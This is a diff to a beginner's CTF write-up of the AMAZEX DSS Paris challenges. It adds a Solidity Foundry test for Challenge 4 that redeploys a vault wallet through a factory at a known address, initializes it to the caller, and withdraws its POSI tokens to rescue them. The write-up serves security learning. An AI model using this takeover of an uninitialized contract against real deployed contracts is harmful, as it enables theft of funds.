@@ -267,3 +267,40 @@ function testWhitehatRescue() public {
 ## Result
 
 ![image](https://github.com/0xumarkhatab/BeginnerLevel-AMAZEX-DSS-PARIS-Writeup/assets/71306738/877909f1-67e2-40ba-9cc8-8a1e6fa3f4d4)
+
+
+
+# Challenge 4
+
+```solidity
+
+   function testWhitehatRescue() public {
+        vm.deal(whitehat, 10 ether);
+        vm.startPrank(whitehat, whitehat);
+        /*////////////////////////////////////////////////////
+        //               Add your hack below!               //
+        //                                                  //
+        // terminal command to run the specific test:       //
+        // forge test --match-contract Challenge4Test -vvvv //
+        ////////////////////////////////////////////////////*/
+
+
+        address adr = FACTORY.deploy( type(VaultWalletTemplate).creationCode, 11);
+        console.log("Deployed address is ",adr);
+        console.log("balance is ",POSI.balanceOf(adr));
+        IVaultWalletTemplate(adr).initialize(address(whitehat));
+
+        IVaultWalletTemplate(adr).withdrawERC20(address(POSI),POSI.balanceOf(adr),whitehat);
+        POSI.transfer(devs,POSI.balanceOf(whitehat));
+
+        //==================================================//
+        vm.stopPrank();
+
+        assertEq(POSI.balanceOf(devs), 1000 ether, "devs' POSI balance should be 1000 POSI");
+    }
+
+```
+
+## Result
+![image](https://github.com/0xumarkhatab/BeginnerLevel-AMAZEX-DSS-PARIS-Writeup/assets/71306738/fc9f8338-963c-42ac-8c11-c7956be0dd83)
+
